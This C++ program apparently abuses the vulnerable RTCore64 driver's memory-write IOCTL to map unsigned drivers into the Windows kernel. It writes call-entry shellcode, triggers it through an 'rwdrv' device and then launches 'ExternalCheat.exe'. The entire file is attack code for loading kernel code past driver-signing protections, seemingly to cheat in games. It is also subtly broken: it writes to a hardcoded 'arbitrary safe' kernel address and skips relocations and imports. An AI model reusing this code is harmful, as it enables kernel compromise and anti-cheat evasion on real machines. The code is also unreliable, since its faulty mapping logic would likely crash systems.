// Final Hybrid ManualSysMapper (RTCore64 for write, mapped rwdrv for trigger)
#include <Windows.h>
#include <winternl.h>
#include <winnt.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

#define IOCTL_RTCORE64_WRITE_MEMORY 0x9C40240C
#define IOCTL_RWDRV_TRIGGER         0x22240C

struct RTCORE64_COPY_MEMORY {
    ULONGLONG address;
    ULONGLONG value;
    ULONG size;
};

HANDLE OpenDevice(const std::string& name) {
    HANDLE hDevice = CreateFileA(name.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open " << name << "\n";
        return nullptr;
    }
    std::cout << "[+] Opened " << name << " handle\n";
    return hDevice;
}

bool LoadFile(const std::string& path, std::vector<BYTE>& out) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return false;
    size_t size = file.tellg();
    file.seekg(0);
    out.resize(size);
    file.read(reinterpret_cast<char*>(out.data()), size);
    return true;
}

PIMAGE_NT_HEADERS64 GetNtHeaders(BYTE* img) {
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(img);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(img + dos->e_lfanew);
    return (nt->Signature == IMAGE_NT_SIGNATURE) ? nt : nullptr;
}

bool WriteKernelRTCore(HANDLE device, ULONGLONG dst, void* src, SIZE_T size) {
    BYTE* data = (BYTE*)src;
    for (SIZE_T i = 0; i < size; i += 8) {
        ULONGLONG chunk = 0;
        memcpy(&chunk, data + i, min(8, size - i));

        RTCORE64_COPY_MEMORY req{ dst + i, chunk, (ULONG)min(8, size - i) };
        DWORD ret = 0;
        if (!DeviceIoControl(device, IOCTL_RTCORE64_WRITE_MEMORY, &req, sizeof(req), nullptr, 0, &ret, nullptr)) {
            std::cerr << "[-] Write failed at 0x" << std::hex << dst + i << "\n";
            return false;
        }
    }
    return true;
}

bool TriggerWithRWDrv(HANDLE hDevice, ULONGLONG shellAddr) {
    RTCORE64_COPY_MEMORY trigger = { shellAddr, 0, 1 };
    DWORD ret = 0;
    return DeviceIoControl(hDevice, IOCTL_RWDRV_TRIGGER, &trigger, sizeof(trigger), nullptr, 0, &ret, nullptr);
}

int main() {
    std::vector<BYTE> memdriver, rwdrv;
    if (!LoadFile("memdriver.sys", memdriver) || !LoadFile("rwdrv.sys", rwdrv)) {
        std::cerr << "[-] Failed to load sys files\n";
        return -1;
    }

    HANDLE rt = OpenDevice("\\\\.\\RTCore64");
    if (!rt) return -1;

    PIMAGE_NT_HEADERS64 ntMem = GetNtHeaders(memdriver.data());
    PIMAGE_NT_HEADERS64 ntRW = GetNtHeaders(rwdrv.data());
    if (!ntMem || !ntRW) {
        std::cerr << "[-] Invalid PE headers\n";
        return -1;
    }

    ULONGLONG base = 0xFFFFF80000000000 + 0x300000; // arbitrary safe kernel region
    ULONGLONG entry = base + ntMem->OptionalHeader.AddressOfEntryPoint;

    std::cout << "[+] Mapping memdriver.sys at 0x" << std::hex << base << "\n";

    if (!WriteKernelRTCore(rt, base, memdriver.data(), ntMem->OptionalHeader.SizeOfHeaders)) return -1;
    auto sec = IMAGE_FIRST_SECTION(ntMem);
    for (int i = 0; i < ntMem->FileHeader.NumberOfSections; ++i, ++sec) {
        if (!WriteKernelRTCore(rt, base + sec->VirtualAddress, memdriver.data() + sec->PointerToRawData, sec->SizeOfRawData))
            return -1;
    }

    std::cout << "[+] Mapping rwdrv.sys (for shell trigger)\n";
    ULONGLONG rwBase = base + 0x100000;
    if (!WriteKernelRTCore(rt, rwBase, rwdrv.data(), ntRW->OptionalHeader.SizeOfHeaders)) return -1;
    sec = IMAGE_FIRST_SECTION(ntRW);
    for (int i = 0; i < ntRW->FileHeader.NumberOfSections; ++i, ++sec) {
        if (!WriteKernelRTCore(rt, rwBase + sec->VirtualAddress, rwdrv.data() + sec->PointerToRawData, sec->SizeOfRawData))
            return -1;
    }

    std::cout << "[+] Writing shellcode into mapped rwdrv region\n";
    BYTE shell[] = {
        0x48, 0xB8, 0,0,0,0,0,0,0,0, // mov rax, entry
        0x48, 0x31, 0xC9,
        0x48, 0x31, 0xD2,
        0xFF, 0xD0, // call rax
        0xC3
    };
    memcpy(shell + 2, &entry, sizeof(entry));
    ULONGLONG shellAddr = rwBase + 0x4000;
    if (!WriteKernelRTCore(rt, shellAddr, shell, sizeof(shell))) return -1;

    std::cout << "[+] Triggering shellcode via rwdrv.sys...\n";
    HANDLE rw = OpenDevice("\\\\.\\rwdrv");
    if (!rw || !TriggerWithRWDrv(rw, shellAddr)) {
        std::cerr << "[-] Shellcode trigger failed\n";
        return -1;
    }

    std::cout << "[+] memdriver.sys executed successfully\n";
    Sleep(2000);
    std::cout << "[+] Launching ExternalCheat.exe...\n";
    system("ExternalCheat.exe");
    return 0;
}